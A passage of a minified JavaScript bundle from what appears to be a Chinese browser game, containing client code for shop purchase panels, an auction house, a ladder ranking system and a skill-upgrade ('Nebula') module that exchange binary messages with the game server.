null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.shopID=t[0],this.updateView()},e.prototype.updateView=function(){if(this.skin&&this.shopID){this.eLimit.text="";var t=o.CommonUtils.getObjectByAttr(l.GlobalConfig.ItemStoreConfig,"itemId",this.shopID),e=t.cost;this.eItem.data={id:this.shopID,type:1,count:1},this.eCostName.text=gettext("消耗{0}：",f.RewardData.CURRENCY_NAME[e.id]),this.iconImg.source=h.ITEM_ICON[e.id],this.eCost.text=this.num*e.count+"",this.numLabel.text=this.num+"";var i={type:e.type,id:e.id,count:e.count*this.num};this.ePrice.setData(i),e.id==h.ITEM_NUMTYPE.Glod?this.maxNum=Math.max(Math.floor(s.ActorCC.gold/e.count),1):e.id==h.ITEM_NUMTYPE.Yb&&(this.maxNum=Math.max(Math.floor(s.ActorCC.yb/e.count),1))}},e.prototype.inputOver=function(){this.num=parseInt(this.numLabel.text),(isNaN(this.num)||this.num<1)&&(this.num=1),this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"";var t=o.CommonUtils.getObjectByAttr(l.GlobalConfig.ItemStoreConfig,"itemId",this.shopID),e=t.cost;this.eCost.text=this.num*e.count+"",this.updateView()},e.prototype.buy=function(){var t=o.CommonUtils.getObjectByAttr(l.GlobalConfig.ItemStoreConfig,"itemId",this.shopID),e=t.cost;if(g.GlobalFun.checkCost(this.num*e.count,e.id,gettext("{0}不足，无法购买",h.ITEM_NAME[e.id]))){var i=[t.index,this.num],n=m.BagCT.ins().rockonNeedNum([{id:t.itemId}]);return n&&m.BagCT.ins().getAllSurplusCount(n)<0?void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void a.Shop.ins().sendBuy(1,[i])}},e}(C);e.BuyItem2Panel=T,window.BuyItem2Panel=T,__reflect(T.prototype,"BuyItem2Panel",[]),window.BuyItem2Panel=T;var b=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];this.weekCfg=i,this.shopID=i.goods?i.goods.id:0,observe(this,this.updateView,a.Shop.ins().postBuyCount,a.Shop.ins().postWeekLimitDatas,a.Shop.ins().postWeekLimitData),this.updateView()},e.prototype.updateView=function(){if(this.skin&&this.shopID){this.eG.visible=!!this.shopID;var t,e="",i=0,n="",o={};this.eBuy.enabled=!0,o=this.weekCfg.goods,this.maxNum=this.weekCfg.Maxcount?Math.max(0,this.weekCfg.Maxcount-a.Shop.ins().getWeekNumById(this.weekCfg.index)):null,e=this.weekCfg.Maxcount?gettext("限购:|C:{0}&T:{1}|/{2}",this.maxNum>0?d.ColorUtil.GREEN:d.ColorUtil.RED,this.maxNum,this.weekCfg.Maxcount):"",this.eBuy.enabled=(!this.weekCfg.openvip||s.ActorCC.vip>=this.weekCfg.openvip)&&(!this.weekCfg.openmonthcard||c.Recharge.ins().monthDay>0),this.weekCfg.openmonthcard>0&&(n=c.Recharge.ins().monthDay>0?gettext("月卡特权"):gettext("月卡用户可够买"));var r=this.weekCfg.cost;if(t=l.GlobalConfig.ItemConfig[this.weekCfg.goods.id],this.num>this.maxNum&&(this.num=this.maxNum),this.eItem.data=o,this.eLimit.textFlow=p.TextFlowMaker.generateTextFlow(e),this.eCost.text=this.num*i+"",this.numLabel.text=this.num+"",this.eName.text=g.GlobalFun.getItemName(this.weekCfg.goods.id),this.weekCfg.goods.id<5);else{var f=u.ItemUtil.getQuality2(t);this.eName.textColor=h.QUALITY_COLOR[f]}this.eDesc.text=n,this.ePrice.setData({type:r.type,id:r.id,count:r.count*this.num})}},e.prototype.inputOver=function(){this.num=parseInt(this.numLabel.text),(isNaN(this.num)||this.num<1)&&(this.num=1),this.num>9999&&(this.num=9999),this.weekCfg.Maxcount&&this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.eCost.text=this.num*this.ePrice.getPrice()+"";var t=this.weekCfg.cost;this.ePrice.setData({type:t.type,id:t.id,count:t.count*this.num})},e.prototype.buy=function(){this.weekCfg.Maxcount&&!this.maxNum&&r.TipsCT.ins().showTips(gettext("购买次数已用完"));var t=this.weekCfg.cost;if(g.GlobalFun.checkCost(this.num*t.count,t.id)){var e=m.BagCT.ins().rockonNeedNum([this.weekCfg.goods]);if(e&&m.BagCT.ins().getAllSurplusCount(e)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if(this.weekCfg.Maxcount)a.Shop.ins().sendBuyWeekLimit(this.weekCfg.index,this.num);else{var i=[this.shopID,this.num];a.Shop.ins().sendBuy(1,[i])}}},e}(C);e.BuyItemPanel=b,window.BuyItemPanel=b,__reflect(b.prototype,"BuyItemPanel",[]),window.BuyItemPanel=b;var w=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];this.weekCfg=i,this.shopID=i.goods.id||0,observe(this,this.updateView,a.Shop.ins().postBuyCount,a.Shop.ins().postWeekLoopLimit),this.updateView()},e.prototype.updateView=function(){if(this.skin&&this.shopID){this.eG.visible=!!this.shopID;var t,e="",i=0,n="",o={};this.eBuy.enabled=!0,o=this.weekCfg.goods,this.maxNum=this.weekCfg.Maxcount?Math.max(0,this.weekCfg.Maxcount-a.Shop.ins().weekLoopLimitDatas[this.weekCfg.index].count):null,e=this.weekCfg.Maxcount?gettext("限购:|C:{0}&T:{1}|/{2}",this.maxNum>0?d.ColorUtil.GREEN:d.ColorUtil.RED,this.maxNum,this.weekCfg.Maxcount):"",this.eBuy.enabled=(!this.weekCfg.openvip||s.ActorCC.vip>=this.weekCfg.openvip)&&(!this.weekCfg.openmonthcard||c.Recharge.ins().monthDay>0),this.weekCfg.openmonthcard>0&&(n=c.Recharge.ins().monthDay>0?gettext("月卡特权"):gettext("月卡用户可够买"));var r=this.weekCfg.cost;if(!r.rid){t=l.GlobalConfig.ItemConfig[o.id],this.num>this.maxNum&&(this.num=this.maxNum),this.eItem.data=o,this.eLimit.textFlow=p.TextFlowMaker.generateTextFlow(e),this.eCost.text=this.num*i+"",this.numLabel.text=this.num+"",this.eName.text=t.name;var f=u.ItemUtil.getQuality2(t);this.eName.textColor=h.QUALITY_COLOR[f],this.eDesc.text=n,this.ePrice.setData({type:r.type,id:r.id,count:r.count*this.num})}}},e.prototype.inputOver=function(){this.num=parseInt(this.numLabel.text),(isNaN(this.num)||this.num<1)&&(this.num=1),this.num>9999&&(this.num=9999),this.weekCfg.Maxcount&&this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.eCost.text=this.num*this.ePrice.getPrice()+"";var t=this.weekCfg.cost;t.rid||this.ePrice.setData({type:t.type,id:t.id,count:t.count*this.num})},e.prototype.buy=function(){this.weekCfg.Maxcount&&!this.maxNum&&r.TipsCT.ins().showTips(gettext("购买次数已用完"));var t=this.weekCfg.cost;if(!t.rid&&g.GlobalFun.checkCost(this.num*t.count,t.id)){var e=m.BagCT.ins().rockonNeedNum([this.weekCfg.goods]);if(e&&m.BagCT.ins().getAllSurplusCount(e)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if(this.weekCfg.Maxcount)a.Shop.ins().sendBuyWeekLoopLimit(this.weekCfg.index,this.num);else{var i=[this.shopID,this.num];a.Shop.ins().sendBuy(1,[i])}}},e}(C);e.BuyItemLoopPanel=w,window.BuyItemLoopPanel=w,__reflect(w.prototype,"BuyItemLoopPanel",[]),window.BuyItemLoopPanel=w;var I=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.cfg=t[0],this.shopID=this.cfg.goods.id||0,observe(this,this.updateView,v.GuildStore.ins().postGuildCb,v.GuildStore.ins().postGuildStore),this.updateView()},e.prototype.updateView=function(){if(this.skin&&this.shopID){this.eG.visible=!!this.shopID;var t,e="",i=0,n="",o={};this.eBuy.enabled=!0,o=this.cfg.goods,this.maxNum=this.cfg.Maxcount?Math.max(0,this.cfg.Maxcount-v.GuildStore.ins().GuildShop[this.cfg.index].count):null,e=this.cfg.Maxcount?gettext("限购:|C:{0}&T:{1}|/{2}",this.maxNum>0?d.ColorUtil.GREEN:d.ColorUtil.RED,this.maxNum,this.cfg.Maxcount):"",this.eBuy.enabled=y.Guild.ins().guildLv>=this.cfg.level;var s=this.cfg.cost;t=l.GlobalConfig.ItemConfig[o.id],this.num>this.maxNum&&(this.num=this.maxNum),this.eItem.data=o,this.eLimit.textFlow=p.TextFlowMaker.generateTextFlow(e),this.eCost.text=this.num*i+"",this.numLabel.text=this.num+"",this.eName.text=t.name;var a=u.ItemUtil.getQuality2(t);this.eName.textColor=h.QUALITY_COLOR[a],this.eDesc.text=n,this.ePrice.setData({type:s.type,id:s.id,count:s.count*this.num})}},e.prototype.inputOver=function(){this.num=parseInt(this.numLabel.text),(isNaN(this.num)||this.num<1)&&(this.num=1),this.num>9999&&(this.num=9999),this.cfg.Maxcount&&this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.eCost.text=this.num*this.ePrice.getPrice()+"";var t=this.cfg.cost;this.ePrice.setData({type:t.type,id:t.id,count:t.count*this.num})},e.prototype.buy=function(){this.cfg.Maxcount&&!this.maxNum&&r.TipsCT.ins().showTips(gettext("购买次数已用完"));var t=this.cfg.cost;if(g.GlobalFun.checkCost(this.num*t.count,t.id)){var e=m.BagCT.ins().rockonNeedNum([this.cfg.goods]);return e&&m.BagCT.ins().getAllSurplusCount(e)<0?void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void v.GuildStore.ins().sendBuy(this.cfg.index,this.num)}},e}(C);e.BuyGuildPanel=I,window.BuyGuildPanel=I,__reflect(I.prototype,"BuyGuildPanel",[]),window.BuyGuildPanel=I;var _=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.cfg=t[0],this.shopID=this.cfg.goods[0].id||0,observe(this,this.updateView,a.Shop.ins().postUpdateBuyMedal),this.updateView()},e.prototype.updateView=function(t){var e;if(void 0===t&&(t=null),this.skin&&this.shopID){this.eG.visible=!!this.shopID;var i,n="",o=0,s="",r={};this.eBuy.enabled=!0,r=this.cfg.goods[0];var c=a.Shop.ins().medalData.exchangeCount,f=0;f=t?t[1]:c[this.cfg.index]||0;var g=this.cfg.costItem;this.cfg.daycount&&2!=this.cfg.buyType?this.maxNum=Math.max(0,this.cfg.daycount-f):this.maxNum=Math.floor(m.BagCT.ins().getBagGoodsCountById(m.BagCT.BAG_TYPE_OTHTER,null===(e=this.cfg.costItem)||void 0===e?void 0:e.id)/g.count),n=this.cfg.daycount&&2!=this.cfg.buyType?gettext("限购:|C:{0}&T:{1}|/{2}",this.maxNum>0?d.ColorUtil.GREEN:d.ColorUtil.RED,this.maxNum,this.cfg.daycount):"",i=l.GlobalConfig.ItemConfig[r.id],this.num>this.maxNum&&(this.num=this.maxNum),this.eItem.data=r,this.eLimit.textFlow=p.TextFlowMaker.generateTextFlow(n),this.eCost.text=this.num*o+"",this.numLabel.text=this.num+"",this.eName.text=i.name;var v=u.ItemUtil.getQuality2(i);this.eName.textColor=h.QUALITY_COLOR[v],this.eDesc.text=s,this.ePrice.setData({type:1,id:g.id,count:g.count*this.num})}},e.prototype.inputOver=function(){this.num=parseInt(this.numLabel.text),(isNaN(this.num)||this.num<1)&&(this.num=1),this.num>9999&&(this.num=9999),this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.eCost.text=this.num*this.ePrice.getPrice()+"";var t=this.cfg.costItem;this.ePrice.setData({type:1,id:t.id,count:t.count*this.num})},e.prototype.buy=function(){2!=this.cfg.buyType&&this.cfg.daycount&&!this.maxNum&&r.TipsCT.ins().showTips(gettext("购买次数已用完"));var t=this.cfg.costItem;if(g.GlobalFun.checkCost(this.num*t.count,t.id)){var e=m.BagCT.ins().rockonNeedNum(this.cfg.goods);return e&&m.BagCT.ins().getAllSurplusCount(e)<0?void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void a.Shop.ins().sendBuyMedal(this.cfg.index,this.num)}},e}(C);e.BuyPeakMarketShopPanel=_,window.BuyPeakMarketShopPanel=_,__reflect(_.prototype,"BuyPeakMarketShopPanel",[]),window.BuyPeakMarketShopPanel=_},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Auction=void 0;var n=i(14),o=i(690),s=i(55),a=i(691),r=i(2),l=i(26),h=i(0),u=i(7),p=i(17),d=function(t){function e(){var e=t.call(this)||this;return e.gRPNumber=0,e.sysId=PackageID.Auction,e.regNetMsg(1,e.postListData),e.regNetMsg(2,e.onOpenSuccess),e.regNetMsg(4,e.postAuctionResult),e.regNetMsg(5,e.postBuyResult),e.regNetMsg(6,e.postRecord),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){this.sendGetList(0),this.sendGetList(1)},e.prototype.sendGetList=function(t){var e=this.getBytes(1);e.writeByte(t),this.sendToServer(e)},e.prototype.postListData=function(t){for(var e=t.readByte(),i=t.readInt(),n=[],s=0;i>s;s++)n.push(new o.AuctionVo(t));n.length>=2&&(this.RPNumber=1,n.sort(this.sort)),0==e?this.auGuildDatas=n:this.auServerDatas=n},e.prototype.sort=function(t,e){return s.Algorithm.sortDesc(t.putAwayTime,e.putAwayTime)},e.prototype.sortByAuTime=function(t,e){return s.Algorithm.sortDesc(t.time,e.time)},Object.defineProperty(e.prototype,"RPNumber",{get:function(){return this.gRPNumber},set:function(t){var e=this.gRPNumber;this.gRPNumber=t,this.gRPNumber!=e&&p.RedPointBaseSys.ins().RpChange()},enumerable:!1,configurable:!0}),e.prototype.sendOpenAuBox=function(t){var e=this.getBytes(2);e.writeInt(t),this.sendToServer(e)},e.prototype.onOpenSuccess=function(t){win.open("AuctionItemChoiceWin",t.readInt(),t.readInt())},e.prototype.sendUseAuBox=function(t,e){var i=this.getBytes(3);i.writeByte(t),i.writeInt(e),this.sendToServer(i)},e.prototype.sendAUction=function(t,e,i){var n=this.getBytes(4);n.writeInt(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.postAuctionResult=function(t){var e=t.readByte();switch(e){case 0:case 1:case 2:var i=new o.AuctionVo(t);if(!i||!(null===i||void 0===i?void 0:i.id))return this.RPNumber=0,void console.error("===>==vo空佐",t);this.RPNumber=1;var n=this.getVoByID(i.id);1==e?(this.deleteVo(n),r.TipsCT.ins().showTips(gettext("物品不存在"))):(this.dateChanged(n,i),r.TipsCT.ins().showTips(0==e?gettext("竞拍成功"):gettext("商品信息已改变")));break;case 3:r.TipsCT.ins().showTips(gettext("还在展示时间"));break;case 4:r.TipsCT.ins().showTips(gettext("活跃额度不足"))}},e.prototype.deleteVo=function(t){if(this.auGuildDatas){var e=this.auGuildDatas.indexOf(t);if(e>=0)return void this.auGuildDatas.splice(e,1)}if(this.auServerDatas){var e=this.auServerDatas.indexOf(t);e>=0&&this.auServerDatas.splice(e,1)}},e.prototype.postUpdate=function(){},e.prototype.postChangeView=function(){},e.prototype.getVoByID=function(t){return this.getVo(t,this.auGuildDatas)||this.getVo(t,this.auServerDatas)},e.prototype.getVo=function(t,e){if(!e||e.length<=0)return null;for(var i=0,n=e;i<n.length;i++){var o=n[i];if(o.id==t)return o}return null},e.prototype.sendBuy=function(t,e){var i=this.getBytes(5);i.writeInt(t),i.writeByte(e),this.sendToServer(i)
},e.prototype.postBuyResult=function(t){var e=t.readByte();switch(e){case 0:case 1:case 2:var i=new o.AuctionVo(t);if(!i||!(null===i||void 0===i?void 0:i.id))return void console.error("===>==vo空佐",t);var n=this.getVoByID(i.id);2!=e?(this.deleteVo(n),r.TipsCT.ins().showTips(1==e?gettext("物品不存在"):gettext("购买成功"))):(this.dateChanged(n,i),r.TipsCT.ins().showTips(gettext("商品信息已改变")));break;case 3:r.TipsCT.ins().showTips(gettext("还在展示时间"));break;case 4:r.TipsCT.ins().showTips(gettext("活跃额度不足"))}},e.prototype.dateChanged=function(t,e){t.type!=e.type?(this.deleteVo(t),0==e.type?(this.auGuildDatas.push(e),this.auGuildDatas.length>=2&&this.auGuildDatas.sort(this.sort)):(this.auServerDatas.push(e),this.auServerDatas.length>=2&&this.auServerDatas.sort(this.sort))):(t.putAwayTime=e.putAwayTime,t.endTime=e.endTime,t.myAuPrice=e.myAuPrice,t.auctionTimes=e.auctionTimes,t.aID=e.aID)},e.prototype.getMaxPageByType=function(t,e){var i=t?this.auServerDatas:this.auGuildDatas;return i&&i.length?Math.ceil(i.length/e):1},e.prototype.getDataByPage=function(t){var e=t?this.auServerDatas:this.auGuildDatas;return e&&e.length?(this.RPNumber=1,e):(this.RPNumber=0,null)},e.prototype.isAuctionOpen=function(){return l.ZsCT.ins().stage>=h.GlobalConfig.AuctionConfig.openzhuanshenglv&&u.GameServerCC.serverOpenDay+1>=h.GlobalConfig.AuctionConfig.openserverday},e.prototype.sendRecord=function(t){var e=this.getBytes(6);e.writeByte(t),this.sendToServer(e)},e.prototype.postRecord=function(t){for(var e,i=t.readByte(),n=t.readShort(),o=[],s=0;n>s;s++)e=new a.AuctionRecordVo(t),e.type=i,o.push(e);return o.length>1&&o.sort(this.sortByAuTime),{type:i,list:o}},__decorate([post()],e.prototype,"postListData",null),__decorate([post()],e.prototype,"postAuctionResult",null),__decorate([post()],e.prototype,"postUpdate",null),__decorate([post()],e.prototype,"postChangeView",null),__decorate([post()],e.prototype,"postBuyResult",null),__decorate([post()],e.prototype,"postRecord",null),e}(n.BaseSystem);e.Auction=d,window.Auction=d,__reflect(d.prototype,"Auction",[]),Systemap.Auction=function(){return d.ins()},window.Auction=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Ladder=void 0;var n=i(14),o=i(88),s=i(71),a=i(305),r=i(4),l=i(30),h=i(0),u=function(t){function e(){var e=t.call(this)||this;return e.isCanReward=!1,e.upLevel=0,e.upId=0,e.upWin=0,e.todayBuyTime=0,e.upWeekRank=0,e.upRankList=[],e._actorInfo=[],e.sysId=PackageID.Ladder,e.regNetMsg(1,e.doLadderInfo),e.regNetMsg(2,e.doGetPlayer),e.regNetMsg(3,e.doPlayResule),e.regNetMsg(5,e.postRankInfoList),e.regNetMsg(6,e.doChallageNum),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){var t=e.ins().isCanReward||e.ins().isOpen?e.ins().challgeNum>0:!1;return t},e.prototype.getActorInfo=function(t){return void 0===t&&(t=-1),-1==t?this._actorInfo:this._actorInfo[t]},e.prototype.sendGetSomeOne=function(){this.sendBaseProto(2)},e.prototype.sendStarPlay=function(t,e){var i=this.getBytes(3);i.writeInt(e),i.writeInt(t),this.sendToServer(i)},e.prototype.sendGetWeekReward=function(){this.sendBaseProto(4)},e.prototype.test=function(){console.log("=====1");for(var t=0;300>t;t++)this.sendGetRankInfo()},e.prototype.sendGetRankInfo=function(){this.sendBaseProto(5)},e.prototype.sendBuyChallgeTime=function(){this.sendBaseProto(6)},e.prototype.doLadderInfo=function(t){this.docodeInfo(t)},e.prototype.postTadderChange=function(){},e.prototype.doGetPlayer=function(t){var e=t.readInt(),i=t.readInt();this._actorInfo.length=0,this._actorInfo.push(e,i),i>0&&(this._actorInfo.push(t.readString()),this._actorInfo.push(t.readByte()),this._actorInfo.push(t.readByte()),this._actorInfo.push(t.readInt()),this._actorInfo.push(t.readInt()))},e.prototype.doPlayResule=function(t){this.doPlayResult(t),e.ins().postRedPoint()},e.prototype.postRankInfoList=function(t){var e=o.Rank.ins().getRankModel(s.RankDataType.TYPE_LADDER),i=t.readShort();e.getDataList().length=i;var n=e.getDataList(),a=0;for(a=0;i>a;++a)this.setRankData(n,a,t);var r=this.getMyRankInfo(n);for(e.selfPos=r?r.pos:0,this.upRankList=[],this.upweekLength=0,i=t.readShort(),a=0;i>a;++a)this.setRankData(this.upRankList,a,t,!0);return this.fillingList(),e},e.prototype.exitResultWin=function(){},e.prototype.setRankData=function(t,e,i,n){void 0===n&&(n=!1),e in t||(t[e]=new a.RankDataLadder),t[e].parser(i,null),t[e].pos=e+1,n&&t[e].id==r.ActorCC.actorID&&(this.upWeekRank=t[e].pos)},e.prototype.doChallageNum=function(t){this.todayBuyTime=t.readInt(),e.ins().postRedPoint()},e.prototype.docodeInfo=function(t){this.isOpen=t.readBoolean(),this.level=t.readInt(),this.nowId=t.readInt(),this.challgeNum=t.readInt();var i=t.readInt();this.challgeCd=1e3*i+egret.getTimer(),this.winNum=t.readInt(),this.lianWin=t.readBoolean(),this.playUpTime=t.readBoolean(),this.playUpTime&&(this.isCanReward=t.readBoolean(),this.upLevel=t.readInt(),this.upId=t.readInt(),this.upWin=t.readInt()),e.ins().postTadderChange()},e.prototype.doPlayResult=function(t){for(var e,i=t.readBoolean(),n=t.readShort(),o=[],s=0;n>s;s++)e=new l.RewardData,e.parser(t),o.push(e);t.readInt(),t.readInt(),t.readInt();win.open("LadderResultWin",i,"isLadderResult")},e.prototype.fillingList=function(){0==this.upweekLength&&(this.upweekLength=this.checkObjListLength());var t=this.upweekLength-this.upRankList.length;if(t>0)for(var e=1;t>e;e++)this.upRankList.push(null);this.configList||(this.configList=this.cloneConfigDataList(h.GlobalConfig.TianTiDanConfig),this.configList.reverse())},e.prototype.getUpRankList=function(){var t=[];for(var e in this.upRankList)this.upRankList[e]&&t.push(this.upRankList[e]);return t},e.prototype.checkObjListLength=function(){for(var t=1;200>t;t++)if(!h.GlobalConfig.TianTiRankAwardConfig[t+""])return t;return 0},e.prototype.getMyRankInfo=function(t){for(var e=0;e<t.length;e++)if(t[e].id==r.ActorCC.actorID)return t[e];return null},e.prototype.getLevelDuanWeiLength=function(t){var e=0,i=h.GlobalConfig.TianTiDanConfig;for(var n in i[t])i[t][n]&&e++;return e},e.prototype.getDuanWeiDesc=function(){var t="",e=this.getLevelConfig();return e&&(t=gettext("{0}{1}段",e.showLevel,this.getZhongwenNumber(e.showDan))),t},e.prototype.getLevelConfig=function(t,e){void 0===t&&(t=-1),void 0===e&&(e=-1),-1==t&&(t=this.level),-1==e&&(e=this.nowId);var i=h.GlobalConfig.TianTiDanConfig;for(var n in i[t])if(i[t][n].id==e)return i[t][n];return null},e.prototype.creatRewardData=function(t){var e;return e=new l.RewardData,e.count=t.count,e.type=t.type,e.id=t.id,e},e.prototype.getZhongwenNumber=function(t){var e="";switch(t){case 1:e=gettext("一");break;case 2:e=gettext("二");break;case 3:e=gettext("三");break;case 4:e=gettext("四");break;case 5:e=gettext("五");break;case 6:e=gettext("六");break;case 7:e=gettext("七");break;case 8:e=gettext("八");break;case 9:e=gettext("九");break;case 10:e=gettext("十")}return e},e.prototype.cloneConfigDataList=function(t){var e,i=[];for(var n in t)for(var o in t[n])e={level:parseInt(n),id:t[n][o].id,showStar:t[n][o].showStar,showDan:t[n][o].showDan,showLevel:t[n][o].showLevel,winAward:t[n][o].winAward,danAward:t[n][o].danAward,state:t[n][o].state},this.checkIshaveOne(i,e)&&i.push(e);return i},e.prototype.checkRedShow=function(){return this.challgeNum>0&&this.isOpen?1:0},e.prototype.checkIshaveOne=function(t,e){for(var i=t.length,n=0;i>n;n++)if(t[n].level==e.level)return!1;return!0},__decorate([post()],e.prototype,"postRedPoint",null),__decorate([post()],e.prototype,"postTadderChange",null),__decorate([post()],e.prototype,"doPlayResule",null),__decorate([post()],e.prototype,"postRankInfoList",null),__decorate([post()],e.prototype,"exitResultWin",null),e}(n.BaseSystem);e.Ladder=u,window.Ladder=u,__reflect(u.prototype,"Ladder",[]),Systemap.Ladder=function(){return u.ins()},window.Ladder=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NebulaCT=void 0;var n=i(19),o=i(22),s=i(72),a=i(34),r=i(14),l=i(17),h=i(0),u=i(4),p=function(t){function e(){var e=t.call(this)||this;return e.totemAllRed=new l.RedPoint,e.nebulaStarArr=[],e.nebulaStartPosArr=[],e.changeSKillID=1,e.isStarOrOrgin=!0,e.selectOrginPos=1e3,e.sysId=PackageID.Nebula,e.regNetMsg(1,e.returnNebulaInfo),e.regNetMsg(2,e.returnNebulaStartPosInfo),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.setID=function(t){var e=this.getBytes(1);e.writeUnsignedShort(t),this.sendToServer(e)},e.prototype.returnNebulaInfo=function(t){var e=t.readUnsignedShort();if(1==e){var i=t.readUnsignedShort(),n=t.readUnsignedShort();for(var o in this.nebulaStarArr)if(this.nebulaStarArr[o].id==i)return this.nebulaStarArr[o].lv=n,void this.uptateNebulaData();var s={id:i,lv:n};this.nebulaStarArr.push(s)}else{this.nebulaStarArr=[];for(var a=0;e>a;a++){var i=t.readUnsignedShort(),n=t.readUnsignedShort();for(var o in this.nebulaStarArr)this.nebulaStarArr[o].id!=i||(this.nebulaStarArr[o].lv=n);var s={id:i,lv:n};this.nebulaStarArr.push(s)}}this.uptateNebulaData()},e.prototype.uptateNebulaData=function(){},e.prototype.returnNebulaStartPosInfo=function(t){var e=t.readUnsignedShort();if(1==e){var i=t.readUnsignedShort(),n=t.readUnsignedShort();for(var o in this.nebulaStartPosArr)if(this.nebulaStartPosArr[o].id==i)return this.nebulaStartPosArr[o].lv=n,void this.uptateNebulaStartPosData();var s={id:i,lv:n};this.nebulaStartPosArr.push(s)}else{this.nebulaStartPosArr=[];for(var a=0;e>a;a++){var i=t.readUnsignedShort(),n=t.readUnsignedShort();for(var o in this.nebulaStartPosArr)this.nebulaStartPosArr[o].id!=i||(this.nebulaStartPosArr[o].lv=n);var s={id:i,lv:n};this.nebulaStartPosArr.push(s)}}this.uptateNebulaStartPosData()},e.prototype.uptateNebulaStartPosData=function(){},e.prototype.setIDOrgin=function(t){var e=this.getBytes(2);e.writeUnsignedShort(t),this.sendToServer(e)},e.prototype.setReset=function(){var t=this.getBytes(3);this.sendToServer(t)},e.prototype.returnSkillLv=function(t){for(var e in this.nebulaStarArr)if(this.nebulaStarArr[e].id==t)return this.nebulaStarArr[e].lv;return 0},e.prototype.returnIsMax=function(t){var e=this.returnSkillLv(t),i=h.GlobalConfig.NebulaLevelConfig,n=1e3*t+e+1;return i[n]?!1:!0},e.prototype.returnIsCanUp=function(t){var e=this.returnIsMax(t);if(!e){var i=h.GlobalConfig.NebulaLevelConfig;if(i){for(var o=this.returnSkillLv(t),s=1e3*t+o,a=!0,r=0;r<i[s].cost.length;r++)n.GlobalFun.checkCost(i[s].cost[r].count,i[s].cost[r].id,"",!1,null,!1)||(a=!1);return a}}return!1},e.prototype.returnIsUpStartPoins=function(t){var e=this.returnOriginPointLv(t),i=h.GlobalConfig.NebulaStartingPointConfig;if(i){var o=1e3*t+e;if(i[o]){var s=!0;if(i[o].cost)for(var a=0;a<i[o].cost.length;a++)n.GlobalFun.checkCost(i[o].cost[a].count,i[o].cost[a].id,"",!1,null,!1)||(s=!1);else s=!1;return s}}return!1},e.prototype.returnOriginPointLv=function(t){for(var e in this.nebulaStartPosArr)if(this.nebulaStartPosArr[e].id==t)return this.nebulaStartPosArr[e].lv;return 0},e.prototype.updateSkillIcon=function(){},e.prototype.returnAttStr=function(t){var e=s.AttributeFormat.FORMAT_1();e.wordColor=null,e.attrColor=null;for(var i in t)if((t[i].type==a.AttributeType.atAtkMin||t[i].type==a.AttributeType.atAtkMax||t[i].type==a.AttributeType.atAtkTaoistMin||t[i].type==a.AttributeType.atAtkTaoistMax||t[i].type==a.AttributeType.atAtkMageMin||t[i].type==a.AttributeType.atAtkMageMax||t[i].type==a.AttributeType.atRes||t[i].type==a.AttributeType.atDef)&&(e.nameType=2,t[i].type==a.AttributeType.atAtkMin||t[i].type==a.AttributeType.atAtkMax))switch(u.ActorCC.jobId){case 2:t[i].type+=4;break;case 3:t[i].type+=2}return o.AttributeData.getAttStr1(t,e,!1)},e.prototype.returnAttStr1=function(t){var e=s.AttributeFormat.getFormat(0,0,"+",0,1,null,null);return e.wordColor=null,e.attrColor=null,o.AttributeData.getAttStr1(t,e)},e.prototype.returnSkillEffectCover=function(t){var e=0,i=h.GlobalConfig.NebulaLevelConfig;if(i)for(var n in this.nebulaStarArr){var o=1e3*this.nebulaStarArr[n].id+this.nebulaStarArr[n].lv;if(i[o]&&i[o].effectId)for(var s in i[o].effectId)i[o].effectId[s]&&i[o].effectId[s].id==t&&(e=i[o].effectId[s].effect)}return e},__decorate([post()],e.prototype,"uptateNebulaData",null),__decorate([post()],e.prototype,"uptateNebulaStartPosData",null),__decorate([post()],e.prototype,"updateSkillIcon",null),e}(r.BaseSystem);e.NebulaCT=p,window.NebulaCT=p,__reflect(p.prototype,"NebulaCT",[]),Systemap.NebulaCT=function(){return p.ins()},window.NebulaCT=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LongGasSiteInfo=e.LongGasCT=void 0;var n=i(19),o=i(22),s=i(72),a=i(34),r=i(14),l=i(37),h=i(17),u=i(0),p=i(15),d=i(4),c=i(13),f=i(6),g=i(12),m=function(t){function e(){var e=t.call(this)||this;return 